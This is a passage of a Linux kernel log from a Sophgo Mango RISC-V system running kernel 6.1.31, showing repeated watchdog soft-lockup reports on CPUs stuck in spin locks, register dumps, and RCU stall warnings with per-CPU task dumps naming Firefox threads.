[  344.307886]  snd_hda_core snd_hwdep
[  344.310938]  snd_hda_intel
[  344.312861]  ofpart snd_pcm
[  344.315911]  snd_intel_dspcfg
[  344.317746]  sophgo_spifmc
[  344.320016]  snd_hda_codec snd_hda_core
[  344.321940]  spi_nor snd_timer
[  344.324037]  snd_hwdep
[  344.326133]  joydev mtd
[  344.330485]  ofpart snd_pcm
[  344.357903]  gpio_dwapb
[  344.364682]  sophgo_spifmc spi_nor
[  344.368945]  snd r8169
[  344.373036]  snd_timer joydev
[  344.377647]  soundcore
[  344.384860]  mtd gpio_dwapb
[  344.392072]  uio_pdrv_genirq uio
[  344.399284]  snd r8169
[  344.406496]  loop ip_tables
[  344.413709]  soundcore uio_pdrv_genirq
[  344.420921]  amdgpu gpu_sched
[  344.428133]  uio loop
[  344.435346]  drm_buddy drm_ttm_helper
[  344.442559]  ip_tables amdgpu
[  344.449772]  ttm
[  344.455077]  gpu_sched
[  344.462982]  spi_dw_mmio spi_dw
[  344.468375]  drm_buddy drm_ttm_helper
[  344.470817]  drm_display_helper
[  344.478637]  ttm spi_dw_mmio
[  344.509004]  cec
[  344.517257]  spi_dw drm_display_helper
[  344.521523] CPU: 5 PID: 2090 Comm: Timer Tainted: G             L     6.1.31 #1
[  344.525611]  cec
[  344.530222] Hardware name: Sophgo Mango (DT)
[  344.537434] 
[  344.537439] CPU: 10 PID: 2126 Comm: StreamTrans #4 Tainted: G             L     6.1.31 #1
[  344.544647] epc : _raw_spin_lock+0x42/0x80
[  344.551859] Hardware name: Sophgo Mango (DT)
[  344.559072]  ra : __handle_mm_fault+0x680/0x122a
[  344.566284] epc : _raw_spin_lock+0x42/0x80
[  344.573496] epc : ffffffff80c6b8e4 ra : ffffffff801f8598 sp : ffffffc82a48bd50
[  344.580709]  ra : __handle_mm_fault+0xe2a/0x122a
[  344.587920]  gp : ffffffff81e76cc8 tp : ffffffd922f73e80 t0 : 0000003faca2f000
[  344.595132] epc : ffffffff80c6b8e4 ra : ffffffff801f8d42 sp : ffffffc82a5a3d50
[  344.602344]  t1 : 0000000000000000 t2 : 0000000000000002 s0 : ffffffc82a48bd60
[  344.607649]  gp : ffffffff81e76cc8 tp : ffffffd904e19f40 t0 : ffffffe03cf52000
[  344.615555]  s1 : 0000000000000004 a0 : ffffffdfe1f1b1e8 a1 : 0000000000000020
[  344.620945]  t1 : 00000000000f0000 t2 : 0000000000000000 s0 : ffffffc82a5a3d60
[  344.625123]  a2 : 000000000431b1c0 a3 : 0000000000000021 a4 : 00000000000003a0
[  344.628258]  s1 : ffffffd90a4c7308 a0 : ffffffdfe1f1b1e8 a1 : 000000000010c6c7
[  344.631742]  a5 : 0000000003a1039b a6 : ffffffd8ffcdb200 a7 : 0000003faccfefff
[  344.634445]  a2 : ffffffd7fde00000 a3 : 00fffffffffff000 a4 : 000000000000039c
[  344.637235]  s2 : 0000000000000000 s3 : ffffffd904bc5c80 s4 : 0000000000000255
[  344.640198]  a5 : 0000000003a1039b a6 : 0000000000000000 a7 : 0007ffffffffffff
[  344.642900]  s5 : 0000000000100073 s6 : ffffffd905395000 s7 : ffffffff8173c1f8
[  344.646730]  s2 : ffffffd904bc5c80 s3 : ffffffe7debc5440 s4 : 700000020fc544d7
[  344.649779]  s8 : 0000000000000255 s9 : 0000000000000001 s10: 0000003faccf2584
[  344.652135]  s5 : ffffffe7debc5440 s6 : ffffffd905395000 s7 : ffffffff8173c1f8
[  344.654577]  s11: 00000000000000d3 t3 : 0000000000000000 t4 : 0000003faccf256c
[  344.657366]  s8 : 0000000000000255 s9 : 0000000000000001 s10: 0000003facc614e0
[  344.659808]  t5 : ffffffd8ffcdb20c t6 : ffffffc82a48bdf0
[  344.663204]  s11: 000000000000038c t3 : 7000000000000000 t4 : 0000000000000080
[  344.665559] status: 0000000200000120 badaddr: 0000000000000000 cause: 8000000000000005
[  344.668522]  t5 : 0000000000000000 t6 : ffffffc82a5a3df0
[  344.670877] [<ffffffff80c6b8e4>] _raw_spin_lock+0x42/0x80
[  344.673665] status: 0000000200000120 badaddr: 0000000000000000 cause: 8000000000000005
[  344.940889] [<ffffffff80c6b8e4>] _raw_spin_lock+0x42/0x80
[  348.294365] watchdog: BUG: soft lockup - CPU#21 stuck for 26s! [Socket Thread:1959]
[  348.302033] Modules linked in: vfat fat rfkill snd_hda_codec_hdmi snd_hda_intel snd_intel_dspcfg snd_hda_codec snd_hda_core snd_hwdep ofc
[  348.332493] CPU: 21 PID: 1959 Comm: Socket Thread Tainted: G             L     6.1.31 #1
[  348.340579] Hardware name: Sophgo Mango (DT)
[  348.344845] epc : _raw_spin_lock_bh+0x48/0x8c
[  348.349205]  ra : lock_sock_nested+0x2c/0x5a
[  348.353479] epc : ffffffff80c6b5b6 ra : ffffffff80a39aaa sp : ffffffc828243ca0
[  348.360694]  gp : ffffffff81e76cc8 tp : ffffffd907af8000 t0 : ffffffc828243e78
[  348.367909]  t1 : 0000003f8b5240cc t2 : 0000000000000000 s0 : ffffffc828243cb0
[  348.375125]  s1 : ffffffe018c73d40 a0 : ffffffe018c73dd8 a1 : 0000000000000000
[  348.382340]  a2 : 0000000000000005 a3 : 0000000000000000 a4 : 0000000000000072
[  348.389554]  a5 : 0000000000730071 a6 : 0000000000000000 a7 : ffffffe005fded38
[  348.396768]  s2 : ffffffe018c73dd8 s3 : 0000000000000040 s4 : 0000000000000005
[  348.403982]  s5 : ffffffc828243df8 s6 : 0000000000000000 s7 : 0000000000000005
[  348.411197]  s8 : 0000000000000000 s9 : 0000003f3d3ed300 s10: 0000003f894ad030
[  348.418412]  s11: 0000000000000005 t3 : 0000003f8d761be8 t4 : 000000041315af29
[  348.425627]  t5 : 0000000000000001 t6 : 0000003f3d3a1108
[  348.430933] status: 0000000200000120 badaddr: 0000000000000000 cause: 8000000000000005
[  348.438843] [<ffffffff80c6b5b6>] _raw_spin_lock_bh+0x48/0x8c
[  368.294367] watchdog: BUG: soft lockup - CPU#14 stuck for 49s! [StreamTrans #13:2137]
[  368.302201] Modules linked in: vfat fat rfkill snd_hda_codec_hdmi snd_hda_intel snd_intel_dspcfg snd_hda_codec snd_hda_core snd_hwdep ofc
[  368.304370] watchdog: BUG: soft lockup - CPU#20 stuck for 49s! [StreamTrans #15:2139]
[  368.332656] CPU: 14 PID: 2137 Comm: StreamTrans #13 Tainted: G             L     6.1.31 #1
[  368.332662] Hardware name: Sophgo Mango (DT)
[  368.340481] Modules linked in: vfat
[  368.348736] epc : _raw_spin_lock+0x7a/0x80
[  368.353002]  fat rfkill
[  368.356486]  ra : __handle_mm_fault+0xe2a/0x122a
[  368.360577]  snd_hda_codec_hdmi snd_hda_intel
[  368.363020] epc : ffffffff80c6b91c ra : ffffffff801f8d42 sp : ffffffc82a5f3d50
[  368.367632]  snd_intel_dspcfg snd_hda_codec
[  368.371983]  gp : ffffffff81e76cc8 tp : ffffffd9041e9f40 t0 : ffffffe042c73000
[  368.379195]  snd_hda_core snd_hwdep
[  368.383372]  t1 : fffffff6df89e640 t2 : 0000000000000000 s0 : ffffffc82a5f3d60
[  368.390585]  ofpart snd_pcm
[  368.394069]  s1 : ffffffd90a4c7308 a0 : ffffffdfe1f1b1e8 a1 : 000000000010c6c7
[  368.401282]  sophgo_spifmc spi_nor
[  368.404072]  a2 : ffffffd7fde00000 a3 : 00fffffffffff000 a4 : 000000000000039f
[  368.411284]  snd_timer joydev
[  368.414681]  a5 : 000000000000039b a6 : 0000000000000001 a7 : 0000000000000014
[  368.421894]  mtd gpio_dwapb
[  368.424857]  s2 : ffffffd904bc5c80 s3 : ffffffe7ded39c80 s4 : 700000021139c8d7
[  368.432069]  snd r8169
[  368.434859]  s5 : ffffffe7ded39c80 s6 : ffffffd905395000 s7 : ffffffff8173c1f8
[  368.442071]  soundcore uio_pdrv_genirq
[  368.444428]  s8 : 0000000000000255 s9 : 0000000000000001 s10: 0000003facc614e0
[  368.444433]  s11: 0000000000000392 t3 : 7000000000000000 t4 : 0000000000000080
[  368.451647]  uio loop
[  368.455392]  t5 : 0000000000000000 t6 : ffffffc82a5f3df0
[  368.455395] status: 0000000200000120 badaddr: 0000000000000000 cause: 8000000000000005
[  368.462604]  ip_tables amdgpu
[  368.469817] [<ffffffff80c6b91c>] _raw_spin_lock+0x7a/0x80
[  368.472086]  gpu_sched drm_buddy drm_ttm_helper ttm spi_dw_mmio spi_dw drm_display_helper cec
[  368.502180] CPU: 20 PID: 2139 Comm: StreamTrans #15 Tainted: G             L     6.1.31 #1
[  368.510438] Hardware name: Sophgo Mango (DT)
[  368.514703] epc : _raw_spin_lock+0x42/0x80
[  368.518801]  ra : __handle_mm_fault+0xe2a/0x122a
[  368.523417] epc : ffffffff80c6b8e4 ra : ffffffff801f8d42 sp : ffffffc82a603d50
[  368.530632]  gp : ffffffff81e76cc8 tp : ffffffd9041eddc0 t0 : ffffffd92d748000
[  368.537848]  t1 : fffffff6df946500 t2 : 0000000000000100 s0 : ffffffc82a603d60
[  368.545063]  s1 : ffffffd90a4c7308 a0 : ffffffdfe1f1b1e8 a1 : 000000000010c6c7
[  368.552277]  a2 : ffffffd7fde00000 a3 : 00fffffffffff000 a4 : 000000000000039d
[  368.559492]  a5 : 0000000003a1039b a6 : 0000000000000001 a7 : 0000000000000014
[  368.566707]  s2 : ffffffd904bc5c80 s3 : ffffffdfe27e51c0 s4 : 700000004be51cd7
[  368.573921]  s5 : ffffffdfe27e51c0 s6 : ffffffd905395000 s7 : ffffffff8173c1f8
[  368.581136]  s8 : 0000000000000255 s9 : 0000000000000001 s10: 0000003facc614e0
[  368.588350]  s11: 000000000000038e t3 : 7000000000000000 t4 : 0000000000000080
[  368.595566]  t5 : 0000000000000000 t6 : ffffffc82a603df0
[  368.600872] status: 0000000200000120 badaddr: 0000000000000000 cause: 8000000000000005
[  368.608781] [<ffffffff80c6b8e4>] _raw_spin_lock+0x42/0x80
[  372.296365] watchdog: BUG: soft lockup - CPU#10 stuck for 52s! [StreamTrans #4:2126]
[  372.296368] watchdog: BUG: soft lockup - CPU#5 stuck for 52s! [Timer:2090]
[  372.296380] Modules linked in:
[  372.304112] Modules linked in: vfat fat
[  372.310982]  vfat
[  372.314032]  rfkill snd_hda_codec_hdmi
[  372.317864]  fat rfkill
[  372.319787]  snd_hda_intel snd_intel_dspcfg
[  372.323532]  snd_hda_codec_hdmi
[  372.325974]  snd_hda_codec snd_hda_core
[  372.330152]  snd_hda_intel
[  372.333287]  snd_hwdep ofpart
[  372.337118]  snd_intel_dspcfg
[  372.339820]  snd_pcm sophgo_spifmc
[  372.342784]  snd_hda_codec snd_hda_core
[  372.345747]  spi_nor snd_timer
[  372.349144]  snd_hwdep ofpart
[  372.352974]  joydev mtd
[  372.356025]  snd_pcm
[  372.358988]  gpio_dwapb snd
[  372.361431]  sophgo_spifmc spi_nor
[  372.363614]  r8169 soundcore
[  372.366404]  snd_timer
[  372.369800]  uio_pdrv_genirq uio
[  372.372677]  joydev
[  372.375032]  loop ip_tables
[  372.378257]  mtd gpio_dwapb
[  372.380352]  amdgpu gpu_sched
[  372.383143]  snd r8169
[  372.385932]  drm_buddy drm_ttm_helper
[  372.388895]  soundcore uio_pdrv_genirq
[  372.391251]  ttm spi_dw_mmio
[  372.394908]  uio loop
[  372.398652]  spi_dw drm_display_helper
[  372.401529]  ip_tables
[  372.403798]  cec
[  372.407541]  amdgpu
[  372.409897] CPU: 5 PID: 2090 Comm: Timer Tainted: G             L     6.1.31 #1
[  372.411732]  gpu_sched drm_buddy
[  372.413827] Hardware name: Sophgo Mango (DT)
[  372.413831] epc : _raw_spin_lock+0x42/0x80
[  372.421127]  drm_ttm_helper ttm
[  372.424350]  ra : __handle_mm_fault+0x680/0x122a
[  372.428615]  spi_dw_mmio
[  372.432705] epc : ffffffff80c6b8e4 ra : ffffffff801f8598 sp : ffffffc82a48bd50
[  372.435841]  spi_dw drm_display_helper
[  372.440451]  gp : ffffffff81e76cc8 tp : ffffffd922f73e80 t0 : 0000003faca2f000
[  372.442981]  cec
[  372.450193]  t1 : 0000000000000000 t2 : 0000000000000002 s0 : ffffffc82a48bd60
[  372.453937] CPU: 10 PID: 2126 Comm: StreamTrans #4 Tainted: G             L     6.1.31 #1
[  372.461148]  s1 : 0000000000000004 a0 : ffffffdfe1f1b1e8 a1 : 0000000000000020
[  372.462984] Hardware name: Sophgo Mango (DT)
[  372.470196]  a2 : 000000000431b1c0 a3 : 0000000000000021 a4 : 00000000000003a0
[  372.478363] epc : _raw_spin_lock+0x42/0x80
[  372.485574]  a5 : 0000000003a1039b a6 : ffffffd8ffcdb200 a7 : 0000003faccfefff
[  372.489838]  ra : __handle_mm_fault+0xe2a/0x122a
[  372.497050]  s2 : 0000000000000000 s3 : ffffffd904bc5c80 s4 : 0000000000000255
[  372.501140] epc : ffffffff80c6b8e4 ra : ffffffff801f8d42 sp : ffffffc82a5a3d50
[  372.508352]  s5 : 0000000000100073 s6 : ffffffd905395000 s7 : ffffffff8173c1f8
[  372.512963]  gp : ffffffff81e76cc8 tp : ffffffd904e19f40 t0 : ffffffe03cf52000
[  372.520175]  s8 : 0000000000000255 s9 : 0000000000000001 s10: 0000003faccf2584
[  372.527387]  t1 : 00000000000f0000 t2 : 0000000000000000 s0 : ffffffc82a5a3d60
[  372.534599]  s11: 00000000000000d3 t3 : 0000000000000000 t4 : 0000003faccf256c
[  372.541810]  s1 : ffffffd90a4c7308 a0 : ffffffdfe1f1b1e8 a1 : 000000000010c6c7
[  372.549022]  t5 : ffffffd8ffcdb20c t6 : ffffffc82a48bdf0
[  372.556234]  a2 : ffffffd7fde00000 a3 : 00fffffffffff000 a4 : 000000000000039c
[  372.563446] status: 0000000200000120 badaddr: 0000000000000000 cause: 8000000000000005
[  372.570659]  a5 : 0000000003a1039b a6 : 0000000000000000 a7 : 0007ffffffffffff
[  372.575963] [<ffffffff80c6b8e4>] _raw_spin_lock+0x42/0x80
[  372.583174]  s2 : ffffffd904bc5c80 s3 : ffffffe7debc5440 s4 : 700000020fc544d7
[  372.610893]  s5 : ffffffe7debc5440 s6 : ffffffd905395000 s7 : ffffffff8173c1f8
[  372.618109]  s8 : 0000000000000255 s9 : 0000000000000001 s10: 0000003facc614e0
[  372.625324]  s11: 000000000000038c t3 : 7000000000000000 t4 : 0000000000000080
[  372.632538]  t5 : 0000000000000000 t6 : ffffffc82a5a3df0
[  372.637845] status: 0000000200000120 badaddr: 0000000000000000 cause: 8000000000000005
[  372.645755] [<ffffffff80c6b8e4>] _raw_spin_lock+0x42/0x80
[  376.308376] watchdog: BUG: soft lockup - CPU#21 stuck for 52s! [Socket Thread:1959]
[  376.316034] Modules linked in: vfat fat rfkill snd_hda_codec_hdmi snd_hda_intel snd_intel_dspcfg snd_hda_codec snd_hda_core snd_hwdep ofc
[  376.346486] CPU: 21 PID: 1959 Comm: Socket Thread Tainted: G             L     6.1.31 #1
[  376.354571] Hardware name: Sophgo Mango (DT)
[  376.358836] epc : _raw_spin_lock_bh+0x4e/0x8c
[  376.363194]  ra : lock_sock_nested+0x2c/0x5a
[  376.367462] epc : ffffffff80c6b5bc ra : ffffffff80a39aaa sp : ffffffc828243ca0
[  376.374677]  gp : ffffffff81e76cc8 tp : ffffffd907af8000 t0 : ffffffc828243e78
[  376.381892]  t1 : 0000003f8b5240cc t2 : 0000000000000000 s0 : ffffffc828243cb0
[  376.389107]  s1 : ffffffe018c73d40 a0 : ffffffe018c73dd8 a1 : 0000000000000000
[  376.396321]  a2 : 0000000000000005 a3 : 0000000000000000 a4 : 0000000000000072
[  376.403535]  a5 : 0000000000730071 a6 : 0000000000000000 a7 : ffffffe005fded38
[  376.410750]  s2 : ffffffe018c73dd8 s3 : 0000000000000040 s4 : 0000000000000005
[  376.417963]  s5 : ffffffc828243df8 s6 : 0000000000000000 s7 : 0000000000000005
[  376.425178]  s8 : 0000000000000000 s9 : 0000003f3d3ed300 s10: 0000003f894ad030
[  376.432393]  s11: 0000000000000005 t3 : 0000003f8d761be8 t4 : 000000041315af29
[  376.439608]  t5 : 0000000000000001 t6 : 0000003f3d3a1108
[  376.444915] status: 0000000200000120 badaddr: 0000000000000000 cause: 8000000000000005
[  376.452824] [<ffffffff80c6b5bc>] _raw_spin_lock_bh+0x4e/0x8c
[  377.288870] rcu: INFO: rcu_sched detected stalls on CPUs/tasks:
[  377.294792] rcu:     0-...!: (0 ticks this GP) idle=b1e4/0/0x1 softirq=5107/5107 fqs=0
[  377.302447] rcu:     2-...!: (0 ticks this GP) idle=0e64/1/0x4000000000000000 softirq=2451/2451 fqs=0
[  377.311400] rcu:     5-...!: (5876 ticks this GP) idle=7b84/1/0x4000000000000000 softirq=1892/1892 fqs=0
[  377.320613] rcu:     6-...!: (1 GPs behind) idle=687c/1/0x4000000000000000 softirq=2229/2229 fqs=0
[  377.329306] rcu:     7-...!: (1 GPs behind) idle=770c/1/0x4000000000000000 softirq=910/910 fqs=0
[  377.337825] rcu:     9-...!: (1 GPs behind) idle=f11c/0/0x1 softirq=3697/3697 fqs=0
[  377.345216] rcu:     12-...!: (8 GPs behind) idle=1cb4/1/0x4000000000000000 softirq=4944/4944 fqs=0
[  377.353995] rcu:     14-...!: (5934 ticks this GP) idle=9504/1/0x4000000000000000 softirq=1086/1086 fqs=0
[  377.363295] rcu:     15-...!: (1 ticks this GP) idle=b414/0/0x1 softirq=743/743 fqs=0
[  377.370861] rcu:     16-...!: (0 ticks this GP) idle=1250/0/0x0 softirq=2858/2858 fqs=0 (false positive?)
[  377.380160] rcu:     17-...!: (1 GPs behind) idle=0bd4/1/0x4000000000000000 softirq=4152/4152 fqs=0
[  377.388939] rcu:     18-...!: (1 GPs behind) idle=e2a8/0/0x0 softirq=1591/1592 fqs=0 (false positive?)
[  377.397979] rcu:     19-...!: (1 GPs behind) idle=06c8/0/0x0 softirq=1464/1465 fqs=0 (false positive?)
[  377.407019] rcu:     22-...!: (27 GPs behind) idle=9b24/0/0x1 softirq=1989/1989 fqs=0
[  377.414584] rcu:     24-...!: (100 GPs behind) idle=2250/0/0x0 softirq=1020/1020 fqs=0 (false positive?)
[  377.423796] rcu:     25-...!: (148 GPs behind) idle=1188/0/0x0 softirq=1313/1313 fqs=0 (false positive?)
[  377.433009] rcu:     27-...!: (110 GPs behind) idle=2678/0/0x0 softirq=883/883 fqs=0 (false positive?)
[  377.442048] rcu:     28-...!: (1 GPs behind) idle=94b8/0/0x0 softirq=4746/4746 fqs=0 (false positive?)
[  377.451086] rcu:     29-...!: (1 GPs behind) idle=9f3c/0/0x1 softirq=2711/2712 fqs=0
[  377.458564] rcu:     30-...!: (1 GPs behind) idle=96b4/1/0x4000000000000000 softirq=1983/1984 fqs=0
[  377.467343] rcu:     31-...!: (1 GPs behind) idle=8bac/1/0x4000000000000000 softirq=4758/4759 fqs=0
[  377.476122] rcu:     32-...!: (27 GPs behind) idle=2e20/0/0x0 softirq=901/901 fqs=0 (false positive?)
[  377.485074] rcu:     35-...!: (47 GPs behind) idle=7c30/0/0x0 softirq=350/350 fqs=0 (false positive?)
[  377.494026] rcu:     36-...!: (1034 GPs behind) idle=c9b0/0/0x0 softirq=482/482 fqs=0 (false positive?)
[  377.503152] rcu:     38-...!: (5859 GPs behind) idle=87d8/0/0x0 softirq=252/252 fqs=0 (false positive?)
[  377.512277] rcu:     39-...!: (221 GPs behind) idle=9920/0/0x0 softirq=248/248 fqs=0 (false positive?)
[  377.521316] rcu:     40-...!: (1 GPs behind) idle=7e94/1/0x4000000000000000 softirq=466/467 fqs=0
[  377.529922] rcu:     41-...!: (74 GPs behind) idle=428c/1/0x4000000000000000 softirq=1164/1165 fqs=0
[  377.538788] rcu:     42-...!: (0 ticks this GP) idle=e174/1/0x4000000000000000 softirq=232/232 fqs=0
[  377.547653] rcu:     43-...!: (1024 GPs behind) idle=e6c8/0/0x0 softirq=242/242 fqs=0 (false positive?)
[  377.556779] rcu:     44-...!: (1024 GPs behind) idle=7718/0/0x0 softirq=150/150 fqs=0 (false positive?)
[  377.565905] rcu:     45-...!: (7403 GPs behind) idle=adf0/0/0x0 softirq=151/153 fqs=0 (false positive?)
[  377.575031] rcu:     49-...!: (0 ticks this GP) idle=0e14/1/0x4000000000000000 softirq=832/832 fqs=0
[  377.583896] rcu:     51-...!: (673 GPs behind) idle=1ec0/0/0x0 softirq=404/404 fqs=0 (false positive?)
[  377.592935] rcu:     52-...!: (136 GPs behind) idle=fd50/0/0x0 softirq=639/639 fqs=0 (false positive?)
[  377.601975] rcu:     53-...!: (685 GPs behind) idle=2828/0/0x0 softirq=410/410 fqs=0 (false positive?)
[  377.611014] rcu:     57-...!: (1036 GPs behind) idle=1888/0/0x0 softirq=1363/1363 fqs=0 (false positive?)
[  377.620313] rcu:     60-...!: (1024 GPs behind) idle=fea8/0/0x0 softirq=217/217 fqs=0 (false positive?)
[  377.629438] rcu:     61-...!: (391 GPs behind) idle=3ee8/0/0x0 softirq=342/342 fqs=0 (false positive?)
[  377.638477] rcu:     63-...!: (5340 GPs behind) idle=06f0/0/0x0 softirq=183/183 fqs=0 (false positive?)
[  377.647612]  (detected by 20, t=6035 jiffies, g=31669, q=523 ncpus=64)
[  377.654135] Task dump for CPU 0:
[  377.657360] task:swapper/0       state:R  running task     stack:0     pid:0     ppid:0      flags:0x00000000
[  377.667274] Call Trace:
[  377.669720] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  377.674948] Task dump for CPU 2:
[  377.678173] task:IndexedDB #9    state:R  running task     stack:0     pid:2151  ppid:1059   flags:0x00000000
[  377.688085] Call Trace:
[  377.690529] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  377.695752] Task dump for CPU 5:
[  377.698976] task:Timer           state:R  running task     stack:0     pid:2090  ppid:2015   flags:0x0000000a
[  377.708886] Call Trace:
[  377.711331] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  377.716553] Task dump for CPU 6:
[  377.719778] task:IndexedDB #14   state:R  running task     stack:0     pid:2161  ppid:1059   flags:0x00000000
[  377.729688] Call Trace:
[  377.732132] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  377.737353] [<ffffffff80c648d6>] schedule+0x4e/0xd0
[  377.742229] Task dump for CPU 7:
[  377.745454] task:lxqt-panel      state:R  running task     stack:0     pid:1062  ppid:957    flags:0x00000000
[  377.755364] Call Trace:
[  377.757808] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  377.763031] [<ffffffff80003c8e>] ret_from_syscall+0x0/0x2
[  377.768430] Task dump for CPU 9:
[  377.771656] task:swapper/9       state:R  running task     stack:0     pid:0     ppid:1      flags:0x00000000
[  377.781566] Call Trace:
[  377.784009] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  377.789232] Task dump for CPU 12:
[  377.792543] task:DNS Resolver #3 state:R  running task     stack:0     pid:2110  ppid:1059   flags:0x00000000
[  377.802453] Call Trace:
[  377.804897] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  377.810120] Task dump for CPU 14:
[  377.813432] task:StreamTrans #13 state:R  running task     stack:0     pid:2137  ppid:2015   flags:0x0000000a
[  377.823341] Call Trace:
[  377.825785] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  377.831008] Task dump for CPU 15:
[  377.834319] task:swapper/15      state:R  running task     stack:0     pid:0     ppid:1      flags:0x00000000
[  377.844229] Call Trace:
[  377.846672] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  377.851895] Task dump for CPU 16:
[  377.855207] task:swapper/16      state:R  running task     stack:0     pid:0     ppid:1      flags:0x00000000
[  377.865116] Call Trace:
[  377.867560] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  377.872782] Task dump for CPU 17:
[  377.876094] task:Renderer        state:R  running task     stack:0     pid:1995  ppid:1059   flags:0x00000000
[  377.886004] Call Trace:
[  377.888448] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  377.893671] Task dump for CPU 18:
[  377.896982] task:swapper/18      state:R  running task     stack:0     pid:0     ppid:1      flags:0x00000000
[  377.906892] Call Trace:
[  377.909336] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  377.914558] Task dump for CPU 19:
[  377.917869] task:swapper/19      state:R  running task     stack:0     pid:0     ppid:1      flags:0x00000000
[  377.927779] Call Trace:
[  377.930224] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  377.935446] Task dump for CPU 22:
[  377.938757] task:swapper/22      state:R  running task     stack:0     pid:0     ppid:1      flags:0x00000000
[  377.948666] Call Trace:
[  377.951110] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  377.956333] Task dump for CPU 24:
[  377.959645] task:swapper/24      state:R  running task     stack:0     pid:0     ppid:1      flags:0x00000000
[  377.969554] Call Trace:
[  377.971998] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  377.977220] Task dump for CPU 25:
[  377.980531] task:swapper/25      state:R  running task     stack:0     pid:0     ppid:1      flags:0x00000000
[  377.990440] Call Trace:
[  377.992884] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  377.998106] Task dump for CPU 27:
[  378.001417] task:swapper/27      state:R  running task     stack:0     pid:0     ppid:1      flags:0x00000000
[  378.011327] Call Trace:
[  378.013770] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  378.018992] Task dump for CPU 28:
[  378.022304] task:swapper/28      state:R  running task     stack:0     pid:0     ppid:1      flags:0x00000000
[  378.032213] Call Trace:
[  378.034657] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  378.039879] Task dump for CPU 29:
[  378.043191] task:swapper/29      state:R  running task     stack:0     pid:0     ppid:1      flags:0x00000008
[  378.053099] Call Trace:
[  378.055542] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  378.060765] Task dump for CPU 30:
[  378.064076] task:swapper/30      state:R  running task     stack:0     pid:0     ppid:1      flags:0x00000000
[  378.073986] Call Trace:
[  378.076430] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  378.081652] Task dump for CPU 31:
[  378.084964] task:firefox:gdrv0   state:R  running task     stack:0     pid:2012  ppid:1059   flags:0x00000000
[  378.094874] Call Trace:
[  378.097318] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  378.102540] [<ffffffff80c648d6>] schedule+0x4e/0xd0
[  378.107414] [<ffffffff800c5a0e>] futex_wait_queue+0x9a/0xc0
[  378.112985] [<ffffffff800c5fbc>] futex_wait+0xec/0x170
[  378.118120] [<ffffffff800c2d08>] do_futex+0xd6/0x13a
[  378.123087] [<ffffffff800c2e44>] sys_futex+0xd8/0x156
[  378.128138] [<ffffffff80003c8e>] ret_from_syscall+0x0/0x2
[  378.133535] Task dump for CPU 32:
[  378.136846] task:swapper/32      state:R  running task     stack:0     pid:0     ppid:1      flags:0x00000000
[  378.146756] Call Trace:
[  378.149199] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  378.154422] Task dump for CPU 35:
[  378.157734] task:swapper/35      state:R  running task     stack:0     pid:0     ppid:1      flags:0x00000000
[  378.167644] Call Trace:
[  378.170088] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  378.175310] Task dump for CPU 36:
[  378.178621] task:swapper/36      state:R  running task     stack:0     pid:0     ppid:1      flags:0x00000000
[  378.188531] Call Trace:
[  378.190976] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  378.196197] Task dump for CPU 38:
[  378.199509] task:swapper/38      state:R  running task     stack:0     pid:0     ppid:1      flags:0x00000000
[  378.209418] Call Trace:
[  378.211862] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  378.217084] Task dump for CPU 39:
[  378.220396] task:swapper/39      state:R  running task     stack:0     pid:0     ppid:1      flags:0x00000000
[  378.230305] Call Trace:
[  378.232749] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  378.237970] Task dump for CPU 40:
[  378.241283] task:Privileged Cont state:R  running task     stack:0     pid:2033  ppid:2015   flags:0x00000000
[  378.251192] Call Trace:
[  378.253636] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  378.258858] Task dump for CPU 41:
[  378.262168] task:IndexedDB #6    state:R  running task     stack:0     pid:2144  ppid:1059   flags:0x00000000
[  378.272077] Call Trace:
[  378.274521] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  378.279744] Task dump for CPU 42:
[  378.283056] task:Netlink Monitor state:R  running task     stack:0     pid:1958  ppid:1059   flags:0x00000000
[  378.292965] Call Trace:
[  378.295409] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  378.300632] Task dump for CPU 43:
[  378.303943] task:swapper/43      state:R  running task     stack:0     pid:0     ppid:1      flags:0x00000000
[  378.313853] Call Trace:
[  378.316297] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  378.321519] Task dump for CPU 44:
[  378.324831] task:swapper/44      state:R  running task     stack:0     pid:0     ppid:1      flags:0x00000000
[  378.334740] Call Trace:
[  378.337184] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  378.342406] Task dump for CPU 45:
[  378.345718] task:swapper/45      state:R  running task     stack:0     pid:0     ppid:1      flags:0x00000000
[  378.355627] Call Trace:
[  378.358070] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  378.363294] Task dump for CPU 49:
[  378.366606] task:IndexedDB #16   state:R  running task     stack:0     pid:2166  ppid:1059   flags:0x00000000
[  378.376516] Call Trace:
[  378.378959] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  378.384182] Task dump for CPU 51:
[  378.387493] task:swapper/51      state:R  running task     stack:0     pid:0     ppid:1      flags:0x00000000
[  378.397403] Call Trace:
[  378.399846] [<ffffffff80c642b2>] __schedule+0x312/0x8e8
[  378.405069] Task dump for CPU 52:
